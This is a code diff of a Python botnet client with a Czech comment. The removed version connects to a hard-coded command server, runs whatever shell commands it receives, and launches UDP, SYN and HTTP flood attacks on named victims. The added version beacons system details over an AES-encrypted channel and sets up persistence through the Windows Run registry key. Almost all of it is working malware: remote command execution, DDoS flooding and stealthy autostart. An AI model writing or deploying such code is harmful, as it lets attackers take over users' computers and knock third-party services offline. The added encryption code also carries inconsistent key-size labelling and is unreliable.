@@ -1,79 +1,75 @@
-import socket
-import platform
-import subprocess
-import time
 import os
-import threading
-from scapy.all import IP, UDP, TCP, send
+import socket
+import time
+import platform
+import pickle
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import socket
+import psutil
 
-SERVER_IP = '10.0.1.12'  # Replace with the server's IP
-PORT = 4444
-RECONNECT_INTERVAL = 5
-TIMEOUT = 60 * 60 * 13  # 13 hours
+SOCKET_HOST = 'server_ip_here'  # Změň na IP serveru
+SOCKET_PORT = 4444
+SOCKET_KEY = b'sixteen byte key1234567890123456'  # 32 bytes key
+SOCKET_IV = b'initialvector123'  # 16 bytes IV
 
+# AES ENCRYPTION/DECRYPTION
+def encrypt_msg(msg):
+    cipher = AES.new(SOCKET_KEY, AES.MODE_CBC, SOCKET_IV)
+    pad = 16 - len(msg) % 16
+    msg += chr(pad) * pad
+    return cipher.encrypt(msg.encode())
+
+def decrypt_msg(msg):
+    cipher = AES.new(SOCKET_KEY, AES.MODE_CBC, SOCKET_IV)
+    decrypted = cipher.decrypt(msg)
+    pad = decrypted[-1]
+    return decrypted[:-pad].decode()
+
+# Get OS version
 def get_os_info():
-    return platform.platform()
+    os_info = platform.system() + ' ' + platform.version()
+    return os_info
 
-def get_country_info():
-    try:
-        import requests
-        response = requests.get("https://ipinfo.io")
-        data = response.json()
-        country = data.get("country", "Unknown")
-        return country
-    except Exception as e:
-        return f"Error fetching country: {str(e)}"
-
-def execute_command(cmd):
-    try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-        return output.decode(errors='ignore')
-    except Exception as e:
-        return str(e)
-
-def perform_ddos(victim, port, attack_type, threads):
-    def attack():
-        if attack_type == "UDP":
-            packet = IP(dst=victim)/UDP(dport=port)
-        elif attack_type == "SYN":
-            packet = IP(dst=victim)/TCP(dport=port, flags="S")
-        elif attack_type == "HTTP":
-            packet = IP(dst=victim)/TCP(dport=port)/("GET / HTTP/1.1\r\n\r\n")
-        else:
-            return
-        send(packet, loop=1, verbose=0)
-    
-    threads_list = []
-    for _ in range(threads):
-        t = threading.Thread(target=attack)
-        t.start()
-        threads_list.append(t)
-    
-    for t in threads_list:
-        t.join()
-
-def connect():
-    start_time = time.time()
+# Socket Client
+def connect_to_server():
     while True:
         try:
-            s = socket.socket()
-            s.connect((SERVER_IP, PORT))
-            os_info = get_os_info()
-            country_info = get_country_info()
-            client_info = f"{os_info}\nCountry: {country_info}"
-            s.send(client_info.encode())
-            while True:
-                cmd = s.recv(1024).decode()
-                if cmd.startswith("ATTACK"):
-                    _, victim, port, attack_type, threads = cmd.split()
-                    perform_ddos(victim, int(port), attack_type, int(threads))
-                else:
-                    result = execute_command(cmd)
-                    s.send(result.encode())
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((SOCKET_HOST, SOCKET_PORT))
+            break
         except:
-            if time.time() - start_time > TIMEOUT:
-                break
-            time.sleep(RECONNECT_INTERVAL)
+            print("Server not reachable, retrying in 5 seconds...")
+            time.sleep(5)
 
-if __name__ == '__main__':
-    connect()
+    os_info = get_os_info()
+    msg = encrypt_msg(f'{os_info}|{platform.version()}')
+    s.send(msg)
+    while True:
+        try:
+            msg = s.recv(2048)
+            msg = decrypt_msg(msg)
+            if msg == 'ping':
+                s.send(encrypt_msg('ping'))
+        except:
+            break
+    s.close()
+
+# Auto start on Windows login
+def add_to_registry():
+    reg_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    reg_value = "siliconvaley"
+    script_path = os.path.abspath(__file__)
+    try:
+        import winreg
+        registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+        reg_open = winreg.OpenKey(registry, reg_key, 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(reg_open, reg_value, 0, winreg.REG_SZ, script_path)
+        winreg.CloseKey(reg_open)
+    except ImportError:
+        print("Failed to add to registry")
+
+# Main function to run the client
+if __name__ == "__main__":
+    add_to_registry()
+    connect_to_server()
